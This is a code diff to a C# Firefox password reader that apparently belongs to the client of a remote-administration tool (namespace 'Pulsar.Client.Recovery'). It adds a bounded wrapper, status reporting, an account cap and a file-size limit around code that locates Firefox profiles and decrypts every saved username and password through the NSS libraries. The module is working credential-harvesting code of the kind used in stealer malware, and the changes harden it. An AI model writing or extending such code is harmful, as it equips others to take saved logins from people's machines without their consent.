@@ -12,6 +12,85 @@ namespace Pulsar.Client.Recovery.Browsers
 {
     public class FirefoxPassReader
     {
+        public const int MaxAccountsPerProfile = 512;
+        public const long MaxLoginsFileBytes = 16 * 1024 * 1024;
+
+        public sealed class ReadOutcome
+        {
+            public List<RecoveredAccount> Accounts { get; set; } = new List<RecoveredAccount>();
+            public PasswordRecoveryStatus Status { get; set; } = PasswordRecoveryStatus.Empty;
+            public string Detail { get; set; }
+            public bool Truncated { get; set; }
+        }
+
+        public static ReadOutcome ReadAccountsBounded(string profiles, string name)
+        {
+            var outcome = new ReadOutcome();
+            if (string.IsNullOrEmpty(profiles) || !Directory.Exists(profiles))
+            {
+                outcome.Status = PasswordRecoveryStatus.Unsupported;
+                outcome.Detail = "Firefox profiles directory was not found.";
+                return outcome;
+            }
+
+            try
+            {
+                string[] dirs = Directory.GetDirectories(profiles);
+                if (dirs.Length == 0)
+                {
+                    outcome.Status = PasswordRecoveryStatus.Empty;
+                    outcome.Detail = "No Firefox profile directories were found.";
+                    return outcome;
+                }
+
+                bool foundLoginSource = false;
+                foreach (string dir in dirs)
+                {
+                    if (File.Exists(Path.Combine(dir, "logins.json")) ||
+                        File.Exists(Path.Combine(dir, "signons.sqlite")))
+                    {
+                        foundLoginSource = true;
+                        break;
+                    }
+                }
+
+                if (!foundLoginSource)
+                {
+                    outcome.Status = PasswordRecoveryStatus.Empty;
+                    outcome.Detail = "No Firefox login source was found.";
+                    return outcome;
+                }
+
+                string mozillaPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"Mozilla Firefox");
+                if (!File.Exists(Path.Combine(mozillaPath, "nss3.dll")))
+                {
+                    outcome.Status = PasswordRecoveryStatus.Unsupported;
+                    outcome.Detail = "Mozilla NSS libraries are unavailable.";
+                    return outcome;
+                }
+
+                outcome.Accounts = ReadAccounts(profiles, name);
+                if (outcome.Accounts.Count >= MaxAccountsPerProfile)
+                    outcome.Truncated = true;
+
+                if (outcome.Accounts.Count > 0)
+                {
+                    outcome.Status = PasswordRecoveryStatus.Supported;
+                }
+                else
+                {
+                    outcome.Status = PasswordRecoveryStatus.Empty;
+                    outcome.Detail = "No decryptable Firefox credentials were found.";
+                }
+            }
+            catch (Exception ex)
+            {
+                outcome.Status = PasswordRecoveryStatus.Failed;
+                outcome.Detail = ex.GetType().Name;
+            }
+
+            return outcome;
+        }
 
         /// <inheritdoc />
         public static List<RecoveredAccount> ReadAccounts(string profiles, string name)
@@ -48,6 +127,8 @@ namespace Pulsar.Client.Recovery.Browsers
                     using (var decrypter = new FFDecryptor())
                     {
                         var r = decrypter.Init(dir);
+                        if (!decrypter.IsInitialized)
+                            continue;
                         if (signonsFound)
                         {
                             SQLiteHandler sqlDatabase;
@@ -70,6 +151,8 @@ namespace Pulsar.Client.Recovery.Browsers
 
                             for (int i = 0; i < sqlDatabase.GetRowCount(); i++)
                             {
+                                if (logins.Count >= MaxAccountsPerProfile)
+                                    break;
                                 try
                                 {
                                     var host = sqlDatabase.GetValue(i, "hostname");
@@ -96,6 +179,12 @@ namespace Pulsar.Client.Recovery.Browsers
 
                         if (loginsFound)
                         {
+                            var loginsInfo = new FileInfo(loginsFile);
+                            if (loginsInfo.Length > MaxLoginsFileBytes)
+                            {
+                                break;
+                            }
+
                             FFLogins ffLoginData;
                             using (var sr = File.OpenRead(loginsFile))
                             {
@@ -104,6 +193,8 @@ namespace Pulsar.Client.Recovery.Browsers
 
                             foreach (Login loginData in ffLoginData.Logins)
                             {
+                                if (logins.Count >= MaxAccountsPerProfile)
+                                    break;
                                 string username = decrypter.Decrypt(loginData.EncryptedUsername);
                                 string password = decrypter.Decrypt(loginData.EncryptedPassword);
                                 logins.Add(new RecoveredAccount
